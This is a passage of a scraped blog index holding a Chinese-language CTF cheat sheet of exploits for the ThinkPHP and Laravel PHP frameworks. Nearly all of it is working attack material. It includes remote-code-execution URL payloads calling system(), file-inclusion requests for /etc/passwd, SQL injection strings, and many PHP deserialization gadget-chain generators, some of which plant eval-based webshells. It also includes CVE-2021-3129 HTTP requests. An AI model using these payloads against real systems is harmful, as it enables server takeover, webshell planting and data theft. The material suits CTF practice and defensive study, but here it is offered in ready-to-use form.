位一组","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"}],"author":"Lazzaro"},{"title":"CMS","slug":"web-CMS","date":"2020-05-24T12:24:48.000Z","updated":"2022-10-11T12:21:34.153Z","comments":true,"path":"2020/05/24/web-CMS/","link":"","permalink":"https://lazzzaro.github.io/2020/05/24/web-CMS/","excerpt":"","text":"​ 网站识别：https://www.wappalyzer.com/ Exploit Database: https://www.exploit-db.com/ PHPGGC: https://github.com/ambionics/phpggc 对比源码：diff -r DirA DirB ​ ThinkPHP 版本 关键字：THINK_VERSION 日志 默认形式：如 /202110/11.log（/年月/日.log） 控制器 驼峰命名法控制器如 M1sakaM1yuu，在ThinkPHP官方文档中，访问的正确方式应该是index/m1saka_m1yuu/index，中间使用下划线隔开，但是兼容了index/M1sakaM1yuu/index这样的访问方式，新官方补丁修复后，不允许路由中存在大写字母。 2.x 2.x RCE index.php?s=/index/index/name/$&#123;phpinfo()&#125; 3.2.x 日志：&lt;domain&gt;/Application/Runtime/Logs/Home/21_04_27.log 通用 SQL注入+文件读取+反序列化 ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链 RCE / LFI ThinkPHP3.2.x RCE漏洞通报 如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。 debug模式关 index.php?m=--&gt;&lt;?=phpinfo();?&gt; LFI： index.php?m=Home&amp;c=Index&amp;a=index&amp;value[filename]=./Application/Runtime/Logs/Home/21_06_30.log 或 index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_30.log debug模式开 index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; LFI： index.php?m=Home&amp;c=Index&amp;a=index&amp;value[filename]=./Application/Runtime/Logs/Home/21_06_30.log 或 index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_30.log 限定条件下参数的收集（替换变量名） param/name/value/array/arr/info/list/page/menus/var/data/moudle/module 3.2.3 SQL注入 index.php?m=Home&amp;c=Index&amp;a=index2&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) %23 index.php?username[0]=exp&amp;username[1]==1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) %23 index.php?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1 index.php?m=Home&amp;c=Index&amp;a=sqlvul2&amp;order[updatexml(1,concat(0x3a,user()),1)] 变量覆盖 empty($_content)?include $templateFile:eval(&#39;?&gt;&#39;.$_content); 反序列化+SQL注入 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpnamespace Think\\Image\\Driver;use Think\\Session\\Driver\\Memcache;class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125;&#125;namespace Think\\Session\\Driver;use Think\\Model;class Memcache &#123; protected $handle; public function __construct()&#123; $this-&gt;sessionName=null; $this-&gt;handle= new Model(); &#125;&#125;namespace Think;use Think\\Db\\Driver\\Mysql;class Model&#123; protected $pk; protected $options; protected $data; protected $db; public function __construct()&#123; $this-&gt;options[&#x27;where&#x27;]=&#x27;&#x27;; $this-&gt;pk=&#x27;x&#x27;; $this-&gt;data[$this-&gt;pk]=array( &quot;table&quot;=&gt;&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;, &quot;where&quot;=&gt;&quot;1=1&quot; ); $this-&gt;db=new Mysql(); &#125;&#125;namespace Think\\Db\\Driver;use PDO;class Mysql&#123; protected $options ; protected $config ; public function __construct()&#123; $this-&gt;options= array(PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true ); // 开启才能读取文件 $this-&gt;config= array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;use Think\\Image\\Driver\\Imagick;echo base64_encode(serialize(new Imagick())); 5.0.x 5.0.7&lt;=ver&lt;=5.0.22 未开启强制路由RCE ?s=index/think\\config/get&amp;name=database.username ?s=index/think\\config/get&amp;name=database.password ?s=index/\\think\\Lang/load&amp;file=../../test.jpg ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami ?s=index POST: _method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo ?s=index POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami &lt;5.0.23 ThinkPHP 5.0.0~5.0.23 Request类任意方法调用导致RCE漏洞分析 RCE index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39; index.php?s=captcha POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami index.php?s=index/index POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami 任意文件包含 index.php?s=captcha POST: _method=__construct&amp;method=GET&amp;filter[]=think__include_file&amp;server[]=1&amp;get[]=/etc/passwd &lt;5.0.12 RCE index.php?s=index/index POST: _method=__construct&amp;filter[]=system&amp;method=POST&amp;s=whoami 5.0.21-5.0.23 RCE index.php?s=captcha POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami 5.0.24 反序列化 ThinkPHP v5.0.x 反序列化利用链挖掘 生成phar： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&lt;?phpnamespace think\\process\\pipes &#123; class Windows &#123; private $files = []; public function __construct($files) &#123; $this-&gt;files = [$files]; &#125; &#125;&#125;namespace think &#123; abstract class Model&#123; protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) &#123; $this-&gt;parent = $output; $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;); $this-&gt;error = $modelRelation; &#125; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; function __construct($output, $modelRelation) &#123; parent::__construct($output, $modelRelation); &#125; &#125;&#125;namespace think\\model\\relation&#123; class HasOne extends OneToOne &#123; &#125;&#125;namespace think\\model\\relation &#123; abstract class OneToOne &#123; protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) &#123; $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$query指向Query $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量 &#125; &#125;&#125;namespace think\\db &#123; class Query &#123; protected $model; function __construct($model) &#123; $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; &#125; &#125;&#125;namespace think\\console&#123; class Output&#123; private $handle; protected $styles; function __construct($handle) &#123; $this-&gt;styles = [&#x27;getAttr&#x27;]; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver &#123; class Memcached &#123; protected $handler; function __construct($handle) &#123; $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver &#123; class File &#123; protected $options=null; protected $tag; function __construct()&#123; $this-&gt;options=[ &#x27;expire&#x27; =&gt; 3600, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;, &#x27;data_compress&#x27; =&gt; false, ]; $this-&gt;tag = &#x27;xxx&#x27;; &#125; &#125;&#125;namespace &#123; $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($window); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering();&#125; 5.1.x 通用 未开启强制路由RCE ?s=index/\\think\\Request/input&amp;filter[]=system&amp;data=pwd ?s=index/\\think\\request/input?data[]=-1&amp;filter=phpinfo ?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt; ?s=index/\\think\\view\\driver\\Think/display&amp;template=&lt;?php phpinfo();?&gt; ?s=index/\\think\\view\\driver\\Think/__call&amp;method=display&amp;params[]=&lt;?php system(&#39;whoami&#39;); ?&gt; ?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt; ?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id ?s=/index/\\think\\request/cache&amp;key=1|phpinfo ?s=/index/\\think\\request/cache&amp;key=ls|system 任意文件删除 存在位置：\\thinkphp\\library\\think\\process\\pipes\\Windows.php 12345678910&lt;?phpnamespace think\\process\\pipes;class Pipes &#123;&#125;class Windows extends Pipes &#123; private $files = []; public function __construct() &#123; $this-&gt;files = [&#x27;tmp.txt&#x27;]; &#125;&#125;echo base64_encode(serialize(new Windows())); 5.1.31 RCE index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39; 5.1.38 反序列化 thinkPHP5.1整理 index.php?sss=whoami POST: data=xxxxxx 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpnamespace think;abstract class Model&#123; protected $append = []; private $data = []; function __construct()&#123; $this-&gt;append = [&quot;sss&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;sss&quot;=&gt;new Request()]; &#125;&#125;class Request&#123; protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // 表单ajax伪装变量 &#x27;var_ajax&#x27; =&gt; &#x27;_ajax&#x27;, ]; function __construct()&#123; $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo urlencode(serialize(new Windows()));?&gt; 6.0.x 通用 反序列化 ThinkPHP V6.0.x 反序列化漏洞 a. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace think\\model\\concern;trait Attribute&#123; private $data; private $withAttr;&#125;trait ModelEvent&#123; protected $withEvent;&#125;namespace think;abstract class Model&#123; use model\\concern\\Attribute; use model\\concern\\ModelEvent; private $exists; private $force; private $lazySave; protected $suffix; function __construct($a = &#x27;&#x27;) &#123; $func = function()&#123;phpinfo();&#125;; $b=\\Opis\\Closure\\serialize($func); $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;suffix = $a; $this-&gt;data=[&#x27;x&#x27;=&gt;&#x27;&#x27;]; $c=unserialize($b); $this-&gt;withAttr=[&#x27;x&#x27;=&gt;$c]; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;require &#x27;closure/autoload.php&#x27;;echo urlencode(serialize(new Pivot(new Pivot()))); b. 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace think\\model\\concern;trait Attribute&#123; private $data = [&quot;key&quot; =&gt; [&quot;key1&quot; =&gt; &quot;whoami&quot;]]; private $withAttr = [&quot;key&quot;=&gt;[&quot;key1&quot;=&gt;&quot;system&quot;]]; protected $json = [&quot;key&quot;];&#125;namespace think;abstract class Model&#123; use model\\concern\\Attribute; private $lazySave; protected $withEvent; private $exists; private $force; protected $table; protected $jsonAssoc; function __construct($obj = &#x27;&#x27;) &#123; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; $this-&gt;force = true; $this-&gt;table = $obj; $this-&gt;jsonAssoc = true; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b)); 其他 tp6.0.8反序列化漏洞分析 a. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace League\\Flysystem\\Cached\\Storage;abstract class AbstractCache &#123;&#125;namespace think\\cache;use think\\cache\\Driver;abstract class Driver &#123;&#125;namespace think\\cache\\driver;use think\\cache\\driver;class File extends Driver &#123; protected $options = []; public function __construct() &#123; $this-&gt;options = [ &#x27;expire&#x27; =&gt; 0, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;&#x27;, &#x27;hash_type&#x27; =&gt; &#x27;md5&#x27;, &#x27;data_compress&#x27; =&gt; false, &#x27;tag_prefix&#x27; =&gt; &#x27;tag:&#x27;, &#x27;serialize&#x27;=&gt; [&#x27;system&#x27;] ]; &#125;&#125;namespace think\\filesystem;use League\\Flysystem\\Cached\\Storage\\AbstractCache;class CacheStore extends AbstractCache &#123; protected $store; protected $key; protected $autosave; protected $complete; public function __construct($store) &#123; $this-&gt;autosave = false; $this-&gt;key = &quot;1&quot;; $this-&gt;complete = &#x27;`sleep 10`&#x27;; $this-&gt;store = $store; &#125;&#125;use think\\cache\\driver\\file;$a = new CacheStore(new File());echo serialize($a);echo &quot;&lt;/br&gt;&quot;;echo urlencode(serialize($a));?&gt; b. https://www.heibai.org/1604.htmlhttps://www.cnblogs.com/20175211lyz/p/13639789.htmlhttps://new.qq.com/omn/20200629/20200629A0RG1800.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace League\\Flysystem\\Cached\\Storage;abstract class AbstractCache &#123;&#125;namespace think\\cache;use think\\cache\\Driver;abstract class Driver &#123;&#125;namespace think\\cache\\driver;use think\\cache\\driver;class File extends Driver &#123; protected $options = []; public function __construct() &#123; $this-&gt;options = [ &#x27;expire&#x27; =&gt; 0, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; =&gt; &#x27;php://filter/write=convert.base64-decode/resource=./&#x27;, &#x27;hash_type&#x27; =&gt; &#x27;md5&#x27;, &#x27;data_compress&#x27; =&gt; false, &#x27;tag_prefix&#x27; =&gt; &#x27;tag:&#x27;, &#x27;serialize&#x27;=&gt; [&#x27;trim&#x27;] //使用trim去掉[] ]; &#125;&#125;namespace think\\filesystem;use League\\Flysystem\\Cached\\Storage\\AbstractCache;class CacheStore extends AbstractCache &#123; protected $store; protected $key; protected $autosave; protected $complete; public function __construct($store) &#123; $this-&gt;autosave = false; $this-&gt;key = &quot;1&quot;; $this-&gt;complete = &#x27;uuuPDw/cGhwIHBocGluZm8oKTtldmFsKCRfR0VUWzFdKTs/PiA=&#x27;; $this-&gt;store = $store; &#125;&#125;use think\\cache\\driver\\file;$a = new CacheStore(new File());echo serialize($a);echo &quot;&lt;/br&gt;&quot;;echo urlencode(serialize($a));?&gt; c. https://yq1ng.github.io/z_post/ctfshow-thinkphp%E4%B8%93%E9%A2%98/ 12345678910111213141516171819202122232425262728/*** @Author ying* @Date 8/20/2021 5:01 PM* @Version 1.0*/namespace League\\Flysystem\\Cached\\Storage &#123; use League\\Flysystem\\Adapter\\Local; class Adapter &#123; protected $autosave = true; protected $expire = null; protected $adapter; protected $file; public function __construct() &#123; $this-&gt;autosave = false; $this-&gt;expire = &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;; $this-&gt;adapter = new Local(); $this-&gt;file = &#x27;yq1ng.php&#x27;; &#125; &#125;&#125;namespace League\\Flysystem\\Adapter &#123; class Local &#123; &#125;&#125;namespace &#123; use League\\Flysystem\\Cached\\Storage\\Adapter; echo urlencode(serialize(new Adapter()));&#125; ​ Laravel 版本 vendor/laravel/framework/src/Illuminate/Foundation/Application.php 5.1 5.1.x 反序列化+RCE a. 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace&#123; use Mockery\\Generator\\DefinedTargetClass; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new DefinedTargetClass($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace Mockery\\Generator&#123; use Faker\\ValidGenerator; class DefinedTargetClass &#123; private $rfc; public function __construct($cmd) &#123; $this-&gt;rfc=new ValidGenerator($cmd); &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($cmd) &#123; $this-&gt;default = $cmd; &#125; &#125; class ValidGenerator &#123; protected $generator; protected $validator; protected $maxRetries; public function __construct($cmd)&#123; $this-&gt;generator=new DefaultGenerator($cmd); $this-&gt;maxRetries=9; $this-&gt;validator=&#x27;system&#x27;; &#125; &#125;&#125; b. 1234567891011121314151617181920212223242526272829303132333435&lt;?phpnamespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\Deprecated; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new Deprecated($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Illuminate\\Database\\DatabaseManager; abstract class BaseTag&#123; protected $description; &#125; final class Deprecated extends BaseTag&#123; public function __construct($cmd)&#123; $this-&gt;description=new DatabaseManager($cmd); &#125; &#125;&#125;namespace Illuminate\\Database&#123; class DatabaseManager&#123; protected $app; protected $extensions ; public function __construct($cmd) &#123; $this-&gt;app[&#x27;config&#x27;][&#x27;database.default&#x27;]=$cmd; $this-&gt;app[&#x27;config&#x27;][&#x27;database.connections&#x27;]=array($cmd=&gt;&#x27;system&#x27;); $this-&gt;extensions[$cmd]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; c. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpnamespace&#123; use Prophecy\\Argument\\Token\\ObjectStateToken; class Swift_KeyCache_DiskKeyCache&#123; private $_keys=[&#x27;bit&#x27;=&gt;array(&#x27;bit&#x27;=&gt;&#x27;bit&#x27;)]; private $_path; public function __construct($cmd)&#123; $this-&gt;_path=new ObjectStateToken($cmd); &#125; &#125; echo urlencode(serialize(new Swift_KeyCache_DiskKeyCache($argv[1])));&#125;namespace Prophecy\\Argument\\Token&#123; use Mockery\\Generator\\MockDefinition; use Illuminate\\Validation\\Validator; class ObjectStateToken&#123; private $name; private $value; private $util; public function __construct($cmd)&#123; $this-&gt;name=&#x27;bit&#x27;; $this-&gt;value=new MockDefinition($cmd); $this-&gt;util=new Validator(); &#125; &#125;&#125;namespace Illuminate\\Validation&#123; use Faker\\DefaultGenerator; class Validator&#123; protected $container; protected $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;y&#x27;]=&#x27;xxx@load&#x27;; $this-&gt;container=new DefaultGenerator(); &#125; &#125;&#125;namespace Faker&#123; use Mockery\\Loader\\EvalLoader; class DefaultGenerator &#123; protected $default; public function __construct() &#123; $this-&gt;default = new EvalLoader(); &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Mockery\\Generator&#123; use Illuminate\\Session\\Store; class MockDefinition&#123; protected $config; protected $code; public function __construct($cmd)&#123; $this-&gt;config=new Store(); $this-&gt;code=$cmd; &#125; &#125;&#125;namespace Illuminate\\Session&#123; class Store&#123; protected $name=&#x27;bit&#x27;;//类不存在就行 &#125;&#125; 5.4.x 5.4.30 反序列化（5.4-5.8） Laravel5.4 反序列化漏洞挖掘 a. Illuminate/Support/Manager.php::__call -&gt; driver() -&gt; Illuminate/Notifications/ChannelManager.php 123456789101112131415161718192021222324252627282930313233&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Notifications\\ChannelManager; class PendingBroadcast &#123; protected $events; public function __construct($cmd) &#123; $this-&gt;events = new ChannelManager($cmd); &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Notifications&#123; class ChannelManager &#123; protected $app; protected $defaultChannel; protected $customCreators; public function __construct($cmd) &#123; $this-&gt;app = $cmd; $this-&gt;customCreators = [&#x27;x&#x27; =&gt; &#x27;system&#x27;]; $this-&gt;defaultChannel = &#x27;x&#x27;; &#125; &#125;&#125; b. Illuminate/Validation/Validator.php::__call 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Validation\\Validator; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($cmd) &#123; $this-&gt;events = new Validator(); $this-&gt;event=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Validation&#123; class Validator &#123; public $extensions = [&#x27;&#x27;=&gt;&#x27;system&#x27;]; &#125;&#125; c. Illuminate/Events/Dispatcher.php 12345678910111213141516171819202122232425262728&lt;?phpnamespace Illuminate\\Broadcasting&#123; use Illuminate\\Events\\Dispatcher; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($cmd) &#123; $this-&gt;events = new Dispatcher($cmd); $this-&gt;event=$cmd; &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1])));&#125;namespace Illuminate\\Events&#123; class Dispatcher &#123; protected $listeners; public function __construct($event)&#123; $this-&gt;listeners=[$event=&gt;[&#x27;system&#x27;]]; &#125; &#125;&#125; d. Illuminate/Bus/Dispatcher.php 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace Illuminate\\Bus&#123;class Dispatcher&#123; protected $queueResolver; public function __construct()&#123; $this-&gt;queueResolver = &quot;system&quot;; &#125;&#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Bus\\Dispatcher; class BroadcastEvent&#123; public $connection; public function __construct($cmd)&#123; $this-&gt;connection = $cmd; &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; public function __construct($event)&#123; $this-&gt;events = new Dispatcher(); $this-&gt;event = new BroadcastEvent($event); &#125; &#125; echo base64_encode(serialize(new PendingBroadcast($argv[1]))); &#125;?&gt; e. Mockery/Loader/EvalLoader.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace Illuminate\\Bus&#123; use Mockery\\Loader\\EvalLoader; class Dispatcher&#123; protected $queueResolver; public function __construct()&#123; $this-&gt;queueResolver = [new EvalLoader(),&#x27;load&#x27;]; &#125;&#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Bus\\Dispatcher; use Mockery\\Generator\\MockDefinition; class BroadcastEvent&#123; public $connection; public function __construct($code)&#123; $this-&gt;connection = new MockDefinition($code); &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; public function __construct($event)&#123; $this-&gt;events = new Dispatcher(); $this-&gt;event = new BroadcastEvent($event); &#125; &#125;echo base64_encode(serialize(new PendingBroadcast($argv[1]))); &#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Mockery\\Generator&#123; use Illuminate\\Session\\Store; class MockDefinition&#123; protected $config; protected $code; public function __construct($code)&#123; $this-&gt;config=new Store(); $this-&gt;code=$code; &#125; &#125;&#125;namespace Illuminate\\Session&#123; class Store&#123; protected $name=&#x27;x&#x27;;//类不存在 &#125;&#125;?&gt; 5.7.x 5.7.29 反序列化+RCE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//不用PendingCommand.php&lt;?phpnamespace Symfony\\Component\\Routing\\Loader\\Configurator &#123; class ImportConfigurator &#123; private $parent; public function __construct($parent) &#123; $this-&gt;parent = $parent; &#125; &#125;&#125;namespace Faker &#123; class DefaultGenerator&#123; protected $default; public function __construct($default) &#123; $this-&gt;default = $default; &#125; public function __call($method, $attributes) &#123; return $this-&gt;default; &#125; &#125; class ValidGenerator &#123; protected $generator; protected $validator; protected $maxRetries; public function __construct($validator,$generator) &#123; $this-&gt;generator = new DefaultGenerator($generator); $this-&gt;validator = $validator; $this-&gt;maxRetries = 1; &#125; public function __call($name, $arguments) &#123; $i = 0; do &#123; $res = call_user_func_array(array($this-&gt;generator, $name), $arguments); $i++; if ($i &gt; $this-&gt;maxRetries) &#123; throw new \\OverflowException(sprintf(&#x27;Maximum retries of %d reached without finding a valid value&#x27;, $this-&gt;maxRetries)); &#125; &#125; while (!call_user_func($this-&gt;validator, $res)); return $res; &#125; &#125;&#125;namespace &#123; $a = new Faker\\ValidGenerator(&quot;system&quot;,&quot;cat /flag&quot;); $b = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator($a); echo urlencode(serialize($b));&#125; 7.x 7.30 反序列化+RCE a. 12345678910111213141516171819202122232425&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\Validation\\Validator; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; protected $name=&#x27;call_user_func&#x27;; protected $controller=&#x27;system&#x27;; protected $options; public function __construct($cmd)&#123; $this-&gt;registrar=new Validator(); $this-&gt;options=$cmd; &#125; &#125; echo urlencode(serialize(new PendingResourceRegistration($argv[1])));&#125;namespace Illuminate\\Validation&#123; class Validator&#123; public $extensions = []; public function __construct()&#123; $this-&gt;extensions[&#x27;&#x27;]=&#x27;call_user_func&#x27;; &#125; &#125;&#125; b. 12345678910111213141516171819202122232425262728293031323334&lt;?phpnamespace Illuminate\\Routing&#123; use Illuminate\\View\\InvokableComponentVariable; class PendingResourceRegistration &#123; protected $registrar; protected $registered = false; public function __construct()&#123; $this-&gt;registrar=new InvokableComponentVariable(); &#125; &#125; echo urlencode(serialize(new PendingResourceRegistration()));&#125;namespace Illuminate\\View&#123; use PHPUnit\\Framework\\MockObject\\MockClass; class InvokableComponentVariable&#123; protected $callable; public function __construct()&#123; $this-&gt;callable=array(new MockClass(),&#x27;generate&#x27;); &#125; &#125;&#125;namespace PHPUnit\\Framework\\MockObject&#123; class MockClass&#123; private $classCode; private $mockName; private $configurableMethods; public function __construct()&#123; $this-&gt;classCode=&#x27;eval($_POST[&quot;cmd&quot;]);&#x27;; $this-&gt;mockName=&#x27;bit&#x27;; $this-&gt;configurableMethods=&#x27;bit&#x27;; &#125; &#125;&#125; 8.x 8.26.1 RCE CVE-2021-3129 当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。 1234567891011POST /_ignition/execute-solution HTTP/1.1Host: 192.168.160.130:8077Content-Type: application/jsonContent-Length: 168&#123; &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: &#123; &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;xxxxxxx&quot; &#125;&#125; 页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式。 使用如下数据包清除日志文件： 1234567891011POST /_ignition/execute-solution HTTP/1.1Host: 192.168.160.130:8077Content-Type: application/jsonContent-Length: 328&#123; &quot;solution&quot;: &quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;, &quot;parameters&quot;: &#123; &quot;variableName&quot;: &quot;username&quot;, &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot; &#125;&#125; 9.x 9.1.8 反序列化+RCE https://github.com/1nhann/vulns/issues a. 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Illuminate\\Contracts\\Queue&#123; interface ShouldQueue &#123; &#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher&#123; protected $container; protected $pipeline; protected $pipes = []; protected $handlers = []; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = &quot;system&quot;; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; use Illuminate\\Contracts\\Queue\\ShouldQueue; class BroadcastEvent implements ShouldQueue &#123; function __construct() &#123; &#125; &#125; class PendingBroadcast&#123; protected $events; protected $event; function __construct() &#123; $this-&gt;event = new BroadcastEvent(); $this-&gt;event-&gt;connection = &quot;whoami&quot;; $this-&gt;events = new \\Illuminate\\Bus\\Dispatcher(); &#125; &#125;&#125;namespace&#123; $a = new \\Illuminate\\Broadcasting\\PendingBroadcast(); echo 